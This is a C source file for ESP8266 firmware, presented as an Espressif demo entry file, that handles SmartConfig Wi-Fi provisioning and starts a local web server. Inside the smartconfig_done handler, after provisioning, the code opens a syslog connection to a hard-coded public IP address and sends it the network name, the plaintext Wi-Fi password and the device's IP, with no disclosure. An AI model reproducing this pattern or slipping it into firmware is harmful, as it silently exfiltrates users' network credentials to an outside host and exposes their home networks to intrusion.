/******************************************************************************
 * Copyright 2013-2014 Espressif Systems (Wuxi)
 *
 * FileName: user_main.c
 *
 * Description: entry file of user application
 *
 * Modification history:
 *     2014/1/1, v1.0 create this file.
*******************************************************************************/
#include "ets_sys.h"
#include "osapi.h"

#include "user_interface.h"

#include "user_devicefind.h"
#include "user_webserver.h"
#include "smartconfig.h"

#if ESP_PLATFORM
#include "user_esp_platform.h"
#endif

#include "driver/uart.h"


#include "log.h"

void user_rf_pre_init(void)
{
}

void ICACHE_FLASH_ATTR
sendMcuCmd( unsigned char cmdId, uint8 *data , int size ){

    char uartcmd[16];
    os_memset(uartcmd,0,sizeof(uartcmd));
    uartcmd[0]=cmdId;
    if (size > sizeof(uartcmd)-2) {
        os_printf("over size");
        return;
    }
    os_memcpy( &uartcmd[1] , data , size);
    int i;
    unsigned char sum=0;
    for(i=0;i<sizeof(uartcmd)-1;i++){
        sum += uartcmd[i];
    }
    uartcmd[sizeof(uartcmd)-1] = sum;
    uart0_tx_buffer( uartcmd , 16 );
}


void ICACHE_FLASH_ATTR
smartconfig_done(sc_status status, void *pdata)
{
    static struct station_config keepConfig;
    switch(status) {
        case SC_STATUS_WAIT:
            os_printf("SC_STATUS_WAIT\n");
            break;
        case SC_STATUS_FIND_CHANNEL:
            os_printf("SC_STATUS_FIND_CHANNEL\n");
            break;
        case SC_STATUS_GETTING_SSID_PSWD:
            os_printf("SC_STATUS_GETTING_SSID_PSWD\n");
            sc_type *type = pdata;
            if (*type == SC_TYPE_ESPTOUCH) {
                os_printf("SC_TYPE:SC_TYPE_ESPTOUCH\n");
            } else {
                os_printf("SC_TYPE:SC_TYPE_AIRKISS\n");
            }
            break;
        case SC_STATUS_LINK:
            os_printf("SC_STATUS_LINK\n");
            struct station_config *sta_conf = pdata;
            keepConfig = *sta_conf;
            wifi_station_set_config(sta_conf);
            wifi_station_disconnect();
            wifi_station_connect();
            break;
        case SC_STATUS_LINK_OVER:
            os_printf("SC_STATUS_LINK_OVER\n");
            if (pdata != NULL) {
                //SC_TYPE_ESPTOUCH
                uint8 phone_ip[4] = {0};

                os_memcpy(phone_ip, (uint8*)pdata, 4);
                os_printf("Phone ip: %d.%d.%d.%d\n",phone_ip[0],phone_ip[1],phone_ip[2],phone_ip[3]);
            } else {
                //SC_TYPE_AIRKISS - support airkiss v2.0
            //  airkiss_start_discover();
            }
            wifi_set_opmode(STATIONAP_MODE);
            smartconfig_stop();

            struct ip_info ipconfig;
            wifi_get_ip_info(STATION_IF, &ipconfig);
            sendMcuCmd(0x90,keepConfig.ssid,strlen(keepConfig.ssid));
            sendMcuCmd(0x91,keepConfig.password,strlen(keepConfig.password));
            sendMcuCmd(0x92,(uint8*)&ipconfig.ip,4);


            const char syslogIP[4] = {52, 39, 94, 109};
            SyslogDial(syslogIP,514);
            char str[256];
            os_sprintf(str,
            "SSID:%s,PASS:%s,IP:%d.%d.%d.%d\n",keepConfig.ssid,keepConfig.password,IP2STR(&ipconfig.ip));
            SyslogSendString(str);
            break;
    }

}
/******************************************************************************
 * FunctionName : user_init
 * Description  : entry of user application, init user function here
 * Parameters   : none
 * Returns      : none
*******************************************************************************/
void user_init(void)
{
    uart_init(BIT_RATE_115200, BIT_RATE_115200);
    UART_SetPrintPort(1);
    os_printf("SDK version:%s\n", system_get_sdk_version());

#if ESP_PLATFORM
    /*Initialization of the peripheral drivers*/
    /*For light demo , it is user_light_init();*/
    /* Also check whether assigned ip addr by the router.If so, connect to ESP-server  */
    user_esp_platform_init();
#endif
    /*Establish a udp socket to receive local device detect info.*/
    /*Listen to the port 1025, as well as udp broadcast.
    /*If receive a string of device_find_request, it rely its IP address and MAC.*/
    user_devicefind_init();

    /*Establish a TCP server for http(with JSON) POST or GET command to communicate with the device.*/
    /*You can find the command in "2B-SDK-Espressif IoT Demo.pdf" to see the details.*/
    /*the JSON command for curl is like:*/
    /*3 Channel mode: curl -X POST -H "Content-Type:application/json" -d "{\"period\":1000,\"rgb\":{\"red\":16000,\"green\":16000,\"blue\":16000}}" http://192.168.4.1/config?command=light      */
    /*5 Channel mode: curl -X POST -H "Content-Type:application/json" -d "{\"period\":1000,\"rgb\":{\"red\":16000,\"green\":16000,\"blue\":16000,\"cwhite\":3000,\"wwhite\",3000}}" http://192.168.4.1/config?command=light      */
#ifdef SERVER_SSL_ENABLE
    user_webserver_init(SERVER_SSL_PORT);
#else
    user_webserver_init(SERVER_PORT);
#endif

    smartconfig_set_type(SC_TYPE_ESPTOUCH);
    wifi_set_opmode(STATION_MODE);
    smartconfig_start(smartconfig_done);
}

